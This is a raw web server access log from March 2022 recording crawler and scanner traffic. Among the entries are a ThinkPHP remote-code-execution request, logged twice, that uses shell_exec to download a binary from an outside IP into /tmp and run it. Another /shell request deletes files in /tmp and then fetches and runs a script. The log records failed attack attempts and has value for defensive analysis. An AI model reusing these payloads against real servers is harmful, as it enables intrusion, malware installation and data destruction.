37.0.8.109 - - [16/Mar/2022:03:39:48 +0300] "GET /config/getuser?index=0 HTTP/1.1" 400 271 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
93.107.121.211 - - [16/Mar/2022:03:42:47 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
87.250.224.125 - - [16/Mar/2022:03:49:15 +0300] "GET /?yclid=7710547526903176844 HTTP/1.1" 200 104259 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots yabs01)" "-"
74.82.47.4 - - [16/Mar/2022:03:55:05 +0300] "GET / HTTP/1.1" 301 185 "-" "-" "-"
157.245.70.127 - - [16/Mar/2022:03:56:17 +0300] "GET /ab2g HTTP/1.1" 400 173 "-" "-" "-"
157.245.70.127 - - [16/Mar/2022:03:56:18 +0300] "GET /ab2h HTTP/1.1" 400 173 "-" "-" "-"
220.133.115.170 - - [16/Mar/2022:04:02:47 +0300] "GET /wp-login.php HTTP/1.1" 301 185 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
220.133.115.170 - - [16/Mar/2022:04:02:48 +0300] "GET /wp-login.php HTTP/1.1" 404 30 "http://salon-groom.ru/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
47.119.129.124 - - [16/Mar/2022:04:03:32 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+209.141.59.94/jaws;sh+/tmp/jaws HTTP/1.1" 404 169 "-" "Hello, world" "-"
39.103.239.37 - - [16/Mar/2022:04:04:03 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
192.241.213.10 - - [16/Mar/2022:04:06:53 +0300] "MGLNDD_95.213.169.134_80" 400 173 "-" "-" "-"
192.241.213.10 - - [16/Mar/2022:04:07:19 +0300] "MGLNDD_95.213.169.158_80" 400 173 "-" "-" "-"
212.83.162.123 - - [16/Mar/2022:04:08:46 +0300] "GET / HTTP/1.1" 404 169 "-" "User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:47.0) Gecko/20100101 Firefox/47.0" "-"
27.124.5.112 - - [16/Mar/2022:04:09:30 +0300] "\x16\x03\x01\x00\xB1\x01\x00\x00\xAD\x03\x03\xA4mV\xADz\xD2$\xE5\xD8\xD9C\x1F\xB5\xF5\x09\xB74T;\xE0\xF9+F7\xCD\x0Br\xC6\x87\x8Bl\x87\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 173 "-" "-" "-"
